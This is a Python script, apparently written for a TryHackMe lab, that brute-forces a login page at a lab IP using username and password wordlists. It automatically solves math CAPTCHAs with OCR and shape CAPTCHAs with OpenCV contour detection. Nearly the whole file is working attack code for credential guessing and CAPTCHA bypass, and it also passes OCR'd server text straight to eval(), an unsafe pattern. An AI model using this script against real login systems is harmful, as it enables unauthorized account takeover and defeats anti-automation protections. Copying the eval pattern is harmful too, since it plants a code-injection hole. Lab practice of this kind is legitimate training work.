import base64
import requests
import re
import cv2
import numpy as np
import pytesseract
import pyfiglet

def create_banner(text):
    banner = pyfiglet.figlet_format(text)
    print(banner)

create_banner("z3r0cool")

#Author: Panagiotis Grammenos
#gihub: https://github.com/z3r0cool90


# Function to extract the captcha question and answer from the login page
def extract_captcha(html_content):
    print("Extracting captcha question from the HTML page...")

    # Find all image tags in the HTML
    image_tags = re.findall(r'<img.*?src="data:image/png;base64,(.*?)".*?>', html_content)

    # Process each base64 encoded image
    for img_base64 in image_tags:
        # Decode base64 image string
        img_bytes = base64.b64decode(img_base64)
        
        # Convert image bytes to numpy array
        nparr = np.frombuffer(img_bytes, np.uint8)
        
        # Decode numpy array to OpenCV image
        image = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

        # Use OCR to extract text from image
        captcha_text = pytesseract.image_to_string(image)

        print("Extracted text:", captcha_text)  # Print the extracted text for debugging

        # Try to parse the text as a mathematical expression
        try:
            # Clean up the text: remove non-alphanumeric characters and whitespace
            captcha_text = ''.join(c for c in captcha_text if c.isalnum() or c in {'+', '-', '*', '/', '='})

            # Split the expression by "=" to separate the operands and operator
            operands, operator = captcha_text.split('=')

            # Evaluate the mathematical expression
            answer = eval(operands)
            print("Captcha question:", captcha_text)
            print("Calculated answer:", answer)
            return answer
        except Exception as e:
            print("Failed to parse mathematical expression:", e)

    print("No captcha question found in the HTML.")
    return None

def detect_shapes_in_html(html_content):
    print("Extracting shape information from the HTML page...")

    # Find all image tags in the HTML
    image_tags = re.findall(r'<img.*?src="data:image/png;base64,(.*?)".*?>', html_content)

    # Process each base64 encoded image
    for img_base64 in image_tags:
        # Decode base64 image string
        img_bytes = base64.b64decode(img_base64)
        
        # Convert image bytes to numpy array
        nparr = np.frombuffer(img_bytes, np.uint8)
        
        # Decode numpy array to OpenCV image
        image = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

        # Convert image to grayscale
        gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)

        # Apply adaptive thresholding
        _, thresh = cv2.threshold(gray, 240, 255, cv2.THRESH_BINARY_INV)

        # Find contours
        contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)

        # Iterate through contours
        for contour in contours:
            # Calculate contour area
            area = cv2.contourArea(contour)

            # Approximate the contour to a polygon
            epsilon = 0.03 * cv2.arcLength(contour, True)
            approx = cv2.approxPolyDP(contour, epsilon, True)

            # Get the number of vertices
            num_vertices = len(approx)

            # Classify shapes based on area and number of vertices
            if area < 500:  # Ignore small contours
                continue
            elif num_vertices == 3:
                print(f"triangle")
                return "triangle"
                
            elif num_vertices == 4:
                print(f"square")
                return "square"
            else:
                print(f"circle")
                return "circle"

    print("No shape information found in the HTML.")
    return None

# Read usernames and passwords from files
with open('usernames.txt', 'r') as user_file, open('passwords.txt', 'r') as pass_file:
    usernames = [line.strip() for line in user_file]
    passwords = [line.strip() for line in pass_file]

# URL of the login page
login_url = "http://10.10.102.219/login"

# Initialize unsuccessful login attempt counter
unsuccessful_attempts = 0

# Try each combination of username and password
for username in usernames:
    for password in passwords:
        print(f"Attempting login with username: {username} and password: {password}...")

        session = requests.session()

        # Send login request
        data = {'username': username, 'password': password}
        response = session.post(login_url, data=data)

        try:
            # Check if login was successful
            
            
            if  "Invalid" in response.text:
                print("Login failed: invalid username or password")
                
            elif "captcha" in response.text:
                print("Captcha detected")
            elif "THM" in response.text:
                print("Login successful")
                unsuccessful_attempts = 0
                break
        except Exception as e:
            print("Error parsing HTML response:", e)

        # Increment unsuccessful attempts counter
        unsuccessful_attempts += 1

        # If unsuccessful attempts exceed 3, start solving captcha
        if unsuccessful_attempts >= 3:
            print("Captcha required.")
            # Check if captcha is a shape captcha
            if "shape" not in response.text:
                print("Math captcha detected.")
                # Solve math captcha
                captcha_answer = extract_captcha(response.text)
                data = {'captcha': captcha_answer}
                response = session.post(login_url, data=data)
                if "Correct" in response.text:
                    print("You are correct")

                # Check if captcha is a shape captcha
                
                print("Shape captcha detected.")
                # Solve shape captcha
                shapes_info = detect_shapes_in_html(response.text)
                data = {'captcha': shapes_info}
                response = session.post(login_url, data=data)
                if "Correct" in response.text:
                    print("You are correct")

                # Check if captcha is a math captcha again
                    
                print("Math captcha detected again.")
                        # Solve math captcha again
                captcha_answer = extract_captcha(response.text)
                data = {'captcha': captcha_answer}
                response = session.post(login_url, data=data)
                if "Correct" in response.text:
                    print("You are correct")
                unsuccessful_attempts = 0
            else:
                print("Shape captcha detected.")
                # Solve shape captcha
                shapes_info = detect_shapes_in_html(response.text)
                data = {'captcha': shapes_info}
                response = session.post(login_url, data=data)
                if "Correct" in response.text:
                    print("You are correct")

                # Check if captcha is a math captcha
                
                print("Math captcha detected.")
                    # Solve math captcha
                captcha_answer = extract_captcha(response.text)
                data = {'captcha': captcha_answer}
                response = session.post(login_url, data=data)
                if "Correct" in response.text:
                    print("You are correct")

                    # Check if captcha is a shape captcha again
                    
                print("Shape captcha detected again.")
                        # Solve shape captcha again
                shapes_info = detect_shapes_in_html(response.text)
                data = {'captcha': shapes_info}
                response = session.post(login_url, data=data)
                if "Correct" in response.text:
                    print("You are correct")
                unsuccessful_attempts = 0

        # Check for errors and print the result
        if "Error" in response.text:
            error_message_match = re.search(r'Error(.+)', response.text)
            if error_message_match:
                error_message = error_message_match.group(1)
            else:
                error_message = 'Error message not found'
            print(f"Login failed. Error message: {error_message}")
        else:
            print("Login failed: invalid username or password")
